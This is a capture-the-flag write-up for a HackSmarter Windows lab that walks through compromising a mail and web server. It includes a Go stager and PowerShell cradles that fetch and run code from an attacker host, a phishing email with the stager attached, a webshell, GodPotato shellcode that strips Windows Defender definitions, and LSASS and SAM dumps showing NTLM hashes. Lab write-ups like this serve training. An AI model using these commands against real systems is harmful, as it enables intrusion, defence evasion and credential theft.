---
title: "Evasive"
platform: "HackSmarter"
category: "Windows"
difficulty: "Medium"
date: 2025-11-10
os: "Windows Server 2022"
tags: ["windows", "smtp", "phishing", "av-evasion", "godpotato", "seimpersonate", "mimikatz", "sliver"]
---

---

## Overview

**Platform:** HackSmarter
**Difficulty:** Medium
**IP:** 10.0.29.31

A red team operation targeting a Windows Mail and Web Server. The objective is to gain system access while evading Windows Defender and extracting sensitive information.

**Rules of Engagement:**
- Mail component has anti-bruteforce protection - avoid lockouts
- Windows Defender is enabled and up-to-date

---

## Scope

```
Host              IP Address      Operating System        Role
─────────────────────────────────────────────────────────────────────
WINSERVER01       10.0.29.31      Windows Server 2022     Mail/Web Server
```

---

## Executive Summary

The engagement identified critical vulnerabilities:

- **Anonymous SMB access** exposing internal documentation with credentials
- **Default password policy** allowing user enumeration and authentication
- **Writable web directory** enabling webshell deployment
- **SeImpersonatePrivilege abuse** via GodPotato for SYSTEM access
- **Local SAM database extraction** exposing all local account hashes

**Risk Rating:** High

---

## Attack Path Overview

```
┌─────────────────────────────────────────────────────────────────┐
│     SMB Enumeration → docs Share → User Discovery               │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│     Password Guessing → roger:NewUser2025! → SMTP Auth          │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│     Phishing via SWAKS → Go Stager → Shell as alfonso           │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│     Writable wwwroot → ASPX Shell → IIS AppPool Context         │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│     GodPotato → Disable AV → SYSTEM Shell                       │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│     Mimikatz SAM Dump → Administrator Hash → Full Compromise    │
└─────────────────────────────────────────────────────────────────┘
```

---

# Phase 1: Enumeration

## 1.1 Port Scanning

```bash
nmap -sCV 10.0.29.31 -Pn
```

```
Port      Service         Version
────────────────────────────────────────────────────────
25        SMTP            hMailServer smtpd
80        HTTP            Microsoft IIS httpd 10.0
110       POP3            hMailServer pop3d
135       MSRPC           Microsoft Windows RPC
139       NetBIOS-SSN     Microsoft Windows netbios-ssn
143       IMAP            hMailServer imapd
445       SMB             Microsoft-DS
587       SMTP            hMailServer smtpd
3389      RDP             Microsoft Terminal Services
5985      WinRM           Microsoft HTTPAPI httpd 2.0
```

**Key Findings:**
- hMailServer for email services (SMTP/POP3/IMAP)
- IIS web server on port 80
- Hostname: `winserver01.hs`
- Windows Server 2022 Build 20348

## 1.2 SMTP Enumeration

```bash
msf auxiliary(scanner/smtp/smtp_enum) > run
```

```
[*] 10.0.29.31:25 - Banner: 220 winserver01.hs ESMTP
[*] 10.0.29.31:25 - could not be enumerated (no EXPN, no VRFY, invalid RCPT)
```

SMTP user enumeration methods are disabled.

## 1.3 SMB Enumeration

Testing null session authentication:

```bash
nxc smb 10.0.29.31 -u '' -p ''
```

```
SMB  10.0.29.31  445  WINSERVER01  [-] Winserver01\: STATUS_ACCESS_DENIED
```

Listing shares with smbclient:

```bash
smbclient --no-pass -L //10.0.29.31
```

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
docs            Disk
IPC$            IPC       Remote IPC
```

**Interesting Share:** `docs` - accessible anonymously

## 1.4 Document Discovery

```bash
smbclient --no-pass //10.0.29.31/docs
```

```
smb: \> ls
  .                  D        0  Sun Oct 12 11:22:48 2025
  ..                DHS        0  Sun Oct 12 17:11:59 2025
  mail_doc.pdf       A     1517  Sun Oct 12 11:20:03 2025
  old_user_setup_doc.pdf  A  5185  Sun Oct 12 11:22:48 2025
```

Downloaded both files for analysis.

**mail_doc.pdf contents:**

```
Hello Roger:

Can you send me the EXE program via email once you are done with it?

Sincerely,
Alfonso
```

**old_user_setup_doc.pdf contents:**

```
For new users:

Please set them up with the default password of NewUser2024!

Sincerely,
Roger
```

**Users Identified:** `roger`, `alfonso`
**Default Password:** `NewUser2024!`

## 1.5 RID Brute Force

Using guest access to enumerate users via RID cycling:

```bash
nxc smb 10.0.29.31 -u guest -p '' --rid
```

```
SMB  10.0.29.31  445  WINSERVER01  [+] Winserver01\guest:
SMB  10.0.29.31  445  WINSERVER01  500: WINSERVER01\Administrator (SidTypeUser)
SMB  10.0.29.31  445  WINSERVER01  501: WINSERVER01\Guest (SidTypeUser)
SMB  10.0.29.31  445  WINSERVER01  1000: WINSERVER01\alfonso (SidTypeUser)
SMB  10.0.29.31  445  WINSERVER01  1001: WINSERVER01\roger (SidTypeUser)
```

---

# Phase 2: Initial Access

## 2.1 Password Spraying

Testing default password (adjusted for current year):

```bash
nxc smb 10.0.29.31 -u users.txt -p passwords.txt
```

```
SMB  10.0.29.31  445  WINSERVER01  [-] Winserver01\roger:NewUser2024! STATUS_LOGON_FAILURE
SMB  10.0.29.31  445  WINSERVER01  [-] Winserver01\alfonso:NewUser2024! STATUS_LOGON_FAILURE
SMB  10.0.29.31  445  WINSERVER01  [+] Winserver01\roger:NewUser2025!
```

**Valid Credentials:** `roger:NewUser2025!`

## 2.2 POP3 Access Verification

```bash
telnet 10.0.29.31 110
```

```
+OK POP3
USER roger@winserver01.hs
+OK Send your password
PASS NewUser2025!
+OK Mailbox locked and ready
LIST
+OK 0 messages (0 octets)
```

Mailbox is empty, but credentials work for SMTP authentication.

## 2.3 Payload Development - AV Evasion

Windows Defender is active, requiring a custom stager. Created a simple Go-based stager:

```go
package main

import (
    "os/exec"
)

func main() {
    cmd := exec.Command("powershell", "-NoP", "-NonI", "-W", "Hidden", "-Exec",
        "Bypass", "-Command", "IEX(IWR -UseBasicParsing http://10.200.19.126:8000/stager.ps1)")
    cmd.Run()
}
```

Compile for Windows:

```bash
GOOS=windows GOARCH=amd64 go build -o stager.exe stager.go
```

## 2.4 Phishing via SWAKS

Sent malicious email from roger to alfonso with the stager attached:

```bash
swaks --to 'alfonso@winserver01.hs' --from 'roger@winserver01.hs' \
  --header 'Subject: mail_doc - executable' \
  --body 'Here is the executable you asked for:' \
  --attach-type application/octet-stream \
  --server winserver01.hs --port 25 \
  --timeout 20s --auth LOGIN \
  --auth-user 'roger@winserver01.hs' \
  --auth-password 'NewUser2025!' \
  --attach @stager.exe
```

## 2.5 Initial Shell as alfonso

Alfonso executed the attachment, providing a Sliver implant:

```
[*] Session MANY_SAGE - 10.0.29.31 (Winserver01) - windows/amd64
```

```
[server] sliver (MANY_SAGE) > sa-whoami

UserName                      SID
======================        =========================================
WINSERVER01\alfonso           S-1-5-21-875136113-1806174397-556431496-1000
```

**User Flag:** Found in PDF on alfonso's desktop - "AI is the Future Corp"

## 2.6 Additional Discovery

KeePass database found in alfonso's documents:

```
[server] sliver (MANY_SAGE) > ls C:\users\alfonso\documents

-rw-rw-rw-  Database.kdbx     2.4 KiB  Sun Oct 12 22:16:51 2025
-rw-rw-rw-  mail.ps1          133 B    Sun Oct 12 21:24:07 2025
```

Database could not be cracked offline.

---

# Phase 3: Privilege Escalation

## 3.1 Writable Web Directory

Discovered write access to IIS web root:

```
[server] sliver (MANY_SAGE) > upload test.txt C:\inetpub\wwwroot\test.txt
[*] Wrote file to C:\inetpub\wwwroot\test.txt

[server] sliver (MANY_SAGE) > ls C:\inetpub\wwwroot
drwxrwxrwx  aspnet_client  <dir>
-rw-rw-rw-  iisstart.htm   703 B
-rw-rw-rw-  iisstart.png   97.4 KiB
-rw-rw-rw-  test.txt       0 B
```

## 3.2 ASPX Webshell Deployment

Uploaded a Sliver ASPX runner to the web root and accessed it via browser to get a shell as IIS AppPool:

```
[*] Session 9c900b97 MANY_SAGE - 10.0.29.31 (Winserver01) - windows/amd64

[server] sliver (MANY_SAGE) > sa-whoami

UserName                          SID
================================  =============================================
IIS APPPOOL\DefaultAppPool        S-1-5-82-3006700770-424185619-1745488364-...
```

**Key Privilege:** `SeImpersonatePrivilege` - Enabled

## 3.3 Disabling Windows Defender

Using Donut to create shellcode for GodPotato that disables Defender:

```bash
donut -i GodPotato-NET4.exe -a 2 -b 2 \
  -p '-cmd "cmd /c C:\PROGRA~1\WINDOW~1\MpCmdRun.exe -RemoveDefinitions -All"' \
  -o ./gp_disable.bin
```

Execute the payload:

```powershell
IEX(IWR -UseBasicParsing http://10.200.19.126:8000/stager_gp_v2.ps1)
```

## 3.4 GodPotato Privilege Escalation

With AV disabled, GodPotato can be executed directly:

```powershell
PS C:\temp> .\gp.exe -cmd "cmd /c whoami"
```

```
[*] CombaseModule: 0x140723434029056
[*] DispatchTable: 0x140723436616008
[*] HookRPC
[*] Start PipeServer
[*] Trigger RPCSS
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] Start Search System Token
[*] PID : 868 Token:0x676 User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] CurrentUser: NT AUTHORITY\SYSTEM
nt authority\system
```

## 3.5 SYSTEM Shell

```powershell
.\gp.exe -cmd "powershell.exe IEX(IWR -UseBasicParsing http://10.200.19.126:8000/stager.ps1)"
```

```
[server] sliver (MANY_SAGE) > whoami
Logon ID: NT AUTHORITY\SYSTEM
[*] Current Token ID: NT AUTHORITY\SYSTEM
```

---

# Phase 4: Post-Exploitation

## 4.1 LSASS Memory Dump

Using nanodump for initial credential extraction:

```
[server] sliver (MANY_SAGE) > nanodump 660 lssas.dmp 1 PMDM
[*] Successfully executed nanodump (coff-loader)
```

```bash
python3 -m pypykatz lsa minidump lssas.dmp
```

**alfonso's hash recovered:**
```
Username: alfonso
Domain: WINSERVER01
NT: f3c1fe6280bd6f3bd8bbe39491b97439
```

## 4.2 SAM Database Extraction

Mimikatz provides the Administrator hash:

```
[server] sliver (MANY_SAGE) > mimikatz "lsadump::sam"
```

```
Domain : WINSERVER01
SysKey : e7083307e93d372584854070f734ae21
Local SID : S-1-5-21-875136113-1806174397-556431496

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 4366ec0f86e29be2a4a5e87a1ba922ec

RID  : 000003e8 (1000)
User : alfonso
  Hash NTLM: f3c1fe6280bd6f3bd8bbe39491b97439

RID  : 000003e9 (1001)
User : roger
  Hash NTLM: ac54562d17d839edab4495ae6d2e11eb
```

## 4.3 KeePass Database Access

With Administrator access via RDP, the KeePass database could be accessed using DPAPI-recovered credentials, revealing:

- **Credit Card:** 1234-5555-6666-8521

---

## Credentials Summary

```
Phase 1-2 - Enumeration & Initial Access
────────────────────────────────────────────────────────────────
roger            : NewUser2025!           → SMTP/POP3 access
alfonso          : [Phishing victim]      → Initial shell

Phase 3-4 - Privilege Escalation & Post-Exploitation
────────────────────────────────────────────────────────────────
alfonso          : f3c1fe6280bd6f3bd8bbe39491b97439 (NTLM)
roger            : ac54562d17d839edab4495ae6d2e11eb (NTLM)
Administrator    : 4366ec0f86e29be2a4a5e87a1ba922ec (NTLM)
```

---

## Tools Used

- **Nmap** - Port scanning and service enumeration
- **NetExec (nxc)** - SMB enumeration and password spraying
- **smbclient** - SMB share access
- **SWAKS** - SMTP phishing with attachments
- **Sliver** - C2 framework for implant management
- **GodPotato** - SeImpersonatePrivilege abuse
- **Donut** - Shellcode generation for AV bypass
- **Mimikatz** - SAM database extraction
- **pypykatz** - LSASS dump parsing

---

## References

- [HackTricks - SeImpersonatePrivilege](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens)
- [GodPotato](https://github.com/BeichenDream/GodPotato)
- [SWAKS - Swiss Army Knife for SMTP](http://www.jetmore.org/john/code/swaks/)
- [Sliver C2 Framework](https://github.com/BishopFox/sliver)
